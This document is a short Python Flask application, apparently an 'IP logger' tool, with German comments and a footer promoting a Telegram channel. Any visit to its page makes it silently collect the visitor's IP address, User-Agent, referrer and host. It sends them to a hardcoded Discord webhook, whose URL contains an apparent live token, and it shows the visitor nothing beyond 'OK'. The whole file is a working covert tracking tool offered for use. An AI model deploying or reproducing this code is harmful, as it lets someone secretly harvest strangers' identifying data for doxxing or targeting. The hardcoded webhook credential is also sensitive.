from flask import Flask, request
import requests
import json
import os

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1527305360539517031/X78P4aN1u9gSLbo9mAHZkaDQTNJN-boj4e8eabaARIAFhVMgEw-1YZVpXNXeJxgQNGqQ"

@app.route('/')
def log_ip():
    # Visitor IP richtig holen (Render + Cloudflare etc.)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()  # Erste IP bei mehreren
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'None')
    host = request.headers.get('Host')
    
    payload = {
        "content": f"🌐 **Neuer Besucher**\n\n**IP:** `{ip}`",
        "embeds": [{
            "title": "IP Logger - Neuer Hit",
            "description": f"**IP:** `{ip}`",
            "color": 16711680,
            "fields": [
                {"name": "IP Address", "value": f"`{ip}`", "inline": False},
                {"name": "User-Agent", "value": f"`{user_agent}`", "inline": False},
                {"name": "Referrer", "value": f"`{referrer}`", "inline": False},
                {"name": "Host", "value": f"`{host}`", "inline": False}
            ],
            "footer": {"text": "Ip logger t.me/kane_tools"},
            "timestamp": ""
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass
    
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
